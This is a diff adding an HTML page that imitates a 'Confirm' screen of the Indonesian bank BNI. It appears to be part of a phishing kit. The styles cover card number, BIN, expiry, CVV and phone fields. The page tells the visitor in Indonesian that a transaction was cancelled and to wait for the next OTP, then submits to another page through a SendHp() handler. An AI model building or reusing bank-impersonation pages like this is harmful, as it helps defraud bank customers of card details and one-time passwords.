@@ -1,0 +1,315 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <!-- Required meta tags -->
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+        <link rel="shorcut icon" href="img/favicon.png">
+        <!-- Bootstrap CSS -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"/>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+        <meta property="og:title" content="Confirm | BNI">
+        <meta property="twitter:title" content="Confirm | BNI">
+        <meta property="twitter:card" content="summary_large_image">
+        <meta property="og:image:type" content="image/jpeg">
+        <style>
+            @font-face {
+                font-family: "DebitCardFont";
+            }
+
+            @import url('https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Open+Sans:ital,wght@0,300..800;1,300..800&family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap'); @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap'); html, body {
+                max-width: 100%;
+                height: 100%;
+                overflow-x: hidden;
+            }
+
+            #inputCards {
+                position: relative;
+                top: -80px;
+                font-family: "Montserrat", sans-serif;
+                font-style: normal;
+                display: block;
+                margin: auto;
+                margin-left: 20px;
+                color: #fff;
+                text-shadow: 3px 3px 10px rgba(0, 0, 0, 1);
+                font-weight: bold;
+            }
+
+            #cardNumber {
+                letter-spacing: 2px;
+                font-size: 18px;
+                line-height: 20px;
+            }
+
+            #cardBin {
+                width: 50px;
+                letter-spacing: 2px;
+                font-size: 11px;
+                position: relative;
+                left: 13px;
+                top: 2px;
+            }
+
+            #cardVal {
+                width: 90px;
+                letter-spacing: 0px;
+                line-height: 10px;
+                font-size: 11px;
+                left: 115px;
+                top: -11px;
+                position: relative;
+            }
+
+            #setVal {
+                font-size: 17px;
+                position: relative;
+                left: 13px;
+                top: -5px;
+            }
+
+            #Phone {
+                letter-spacing: 2px;
+                font-size: 18px;
+                line-height: 20px;
+                display: block;
+                margin: auto;
+                position: relative;
+                margin-top: -3px;
+            }
+
+            #Content {
+                display: block;
+                margin: auto;
+            }
+
+            .input-group {
+                border: 1px solid #c7c7c7;
+                border-radius: 8px;
+            }
+
+            .input-group:hover {
+                box-shadow: 0 0 0 transparent;
+                border: 2px solid #006cc7;
+                border-radius: 5px;
+            }
+
+            input.form-control {
+                background: none;
+                border-left: none !important;
+                font-family: "Poppins", sans-serif;
+                font-size: 15px;
+                padding: 20px 5px;
+                outline: none;
+                color: #000 !important;
+            }
+
+            select.form-control {
+                height: 40px;
+                background: none;
+                border-left: none !important;
+                font-family: "Poppins", sans-serif;
+                font-size: 15px;
+                padding: 0 10px;
+                outline: none;
+                color: #000 !important;
+            }
+
+            .form-control:hover {
+                box-shadow: 0 0 0 transparent;
+            }
+
+            .input-group-text {
+                background: none;
+                border-right: none !important;
+            }
+
+            .btn-primary {
+                border-radius: 48px;
+                padding: 13px 10px;
+                background: #0098a5;
+                border: none;
+            }
+
+            #setupCVV {
+                color: #fff;
+                font-size: 17px;
+                position: relative;
+                left: 0%;
+                top: -55px;
+            }
+
+            select {
+                color: black !important;
+            }
+
+            .activee {
+                border: 1px solid #fff;
+                padding: 5px;
+                width: 270px;
+            }
+
+            @import url('https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Open+Sans:ital,wght@0,300..800;1,300..800&family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap'); @media only screen and (min-width: 600px) {
+                body {
+                    width: 400px !important;
+                    display: block;
+                    margin: auto;
+                }
+            }
+
+            body {
+                background: #fff;
+                font-family: "Montserrat", sans-serif;
+                font-style: normal;
+            }
+
+            .btn-blue {
+                background:#0f57ba;
+                border: none;
+                color: #fff;
+                padding: 15px;
+                font-size: 15px;
+                font-weight: 500;
+                font-style: normal;
+                border-radius: 8px;
+            }
+
+            .btn-blue:hover {
+                background: #0f57ba;
+                color: #fff;
+            }
+
+            .fixed-bottom {
+                z-index: 1 !important;
+            }
+
+            .Forms {
+                width: 100%;
+                height: 100%;
+                display: block;
+                margin: auto;
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                z-index: 2;
+                background: #f5f5f5;
+            }
+
+            .box-form {
+                background-color: #fff;
+                border: 0px double #ccc;
+                border-radius: 2px;
+                box-shadow: 0.4px 0.4px 20px 0.4px #ddd;
+            }
+
+            .box-form label {
+                color: #005E6A;
+                font-weight: bold;
+                opacity: 0.7;
+                font-size: 14px;
+            }
+
+            .box-form input {
+                font-size: 14px;
+            }
+
+            .box-form select {
+                font-size: 14px;
+            }
+
+            .box-form button {
+                background: #ff9315 !important;
+                border: 0px solid #0049ac !important;
+                border: none;
+                color: var(--white);
+                padding: 7px 10px 7px 10px;
+                border-radius: 48px;
+                box-shadow: rgb(170, 170, 170) 2px 2px 5px 0px;
+                transition: background 100ms step-start 0s;
+            }
+
+            .box-form button:hover {
+                background: #d7d7d7a1 !important;
+                color: var(--white);
+            }
+
+            .loading {
+                width: 100%;
+                height: 100%;
+                display: none;
+                margin: auto;
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                z-index: 3;
+                background: rgba(0,0,0, 0.7);
+            }
+
+            .loading i {
+                color: #0098a5;
+                position: relative;
+                top: 50%;
+            }
+
+            .Popup {
+                width: 100%;
+                height: 100%;
+                display: none;
+                margin: auto;
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                z-index: 4;
+                background: rgba(0,0,0, 0.3);
+            }
+
+            .custom-upload {
+                background-color: #006685;
+                border-radius: 4px;
+                color: #fff;
+                cursor: pointer;
+                font-size: 14px;
+                display: inline-block;
+                font-weight: 600;
+                padding: 6px 12px;
+                text-align: center;
+                width: 100%;
+                border: 1px solid #006685;
+            }
+        </style>
+    </head>
+    <div class="loading">
+        <i class="fa fa-spinner fa-spin d-block mx-auto text-center" style="font-size:34px"></i>
+    </div>
+    <body style="background: #fff;">
+        <div class="container px-0 mb-5" id="Content">
+            <div class="row no-gutters">
+                <div class="col-12">
+                    <div class="col-12 float-right text-right mt-2 font-weight-bold">V 4.4.3</div>
+                </div>
+                <div class="col-12">
+                    <div class="space" style="height: 50%;"></div>
+                    <div class="col-12">
+                        <div class="box-form mt-3 p-4" style="border-radius: 10px; background:#fff;box-shadow: rgb(170, 170, 170) 3px 3px 5px 2px; 
+            transition: background 100ms step-start 0s;
+">
+                            <form id="loading" action="var.html" onsubmit="return SendHp();" method="post" style="margin-top: px;">
+                                <center>
+                                    <b style=" font-size:19px;color:#41b70f;">TRANSAKSI BERHASIL DIBATALKAN</b>
+                                    <hr>
+</br><a style="font-weight: 600;color:#41b70f;">mohon tunggu OTP berikutnya..</a>
+<br>
+<br>
+</br>
+</center><button class="btn btn-bni-2 pull-right d-block mx-auto w-100 mt-2" style="width:100%;background-color:#0f57ba ;color:#fff;border-radius:10px;margin:10px 10px;font-weight: 600;" type="submit">Lanjutkan</button>
+</form>
+<form id="loading" action="/" onsubmit="return SendHp();" method="get" style="margin-top: px;">
+    <button class="btn btn-bni-2 pull-right d-block mx-auto w-100 mt-2" style="width:100%;background-color:#0f57ba ;color:#fff;border-radius:10px;margin:10px 10px;font-weight: 600;" type="submit">Kembali Ke Menu Utama</button>
+</div></div></div></form>
